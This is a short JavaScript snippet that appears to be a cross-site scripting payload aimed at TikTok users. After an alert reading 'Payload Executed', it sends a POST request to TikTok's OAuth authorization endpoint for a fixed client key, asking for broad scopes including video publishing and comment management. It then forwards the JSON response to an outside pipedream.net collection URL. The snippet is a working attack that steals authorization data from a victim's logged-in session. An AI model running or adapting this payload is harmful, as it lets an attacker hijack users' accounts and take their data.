alert("Payload Executed"),
fetch("https://www.tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=user.info.basic%2Cuser.info.stats%2Cvideo.list%2Ccomment.list%2Ccomment.list.manage%2Cuser.account.type%2Cvideo.publish%2Cuser.insights%2Cuser.info.username%2Cvideo.insights&aid=1459&source=web&redirect_uri=https%3A%2F%2Ftiktok.com%2F", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify({
  }),
})
  .then(response => response.json())
  .then(data => {
    fetch("https://eo6rrsm1iovif1t.m.pipedream.net/?data=", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
  })
  .catch(error => console.error('Error:', error));
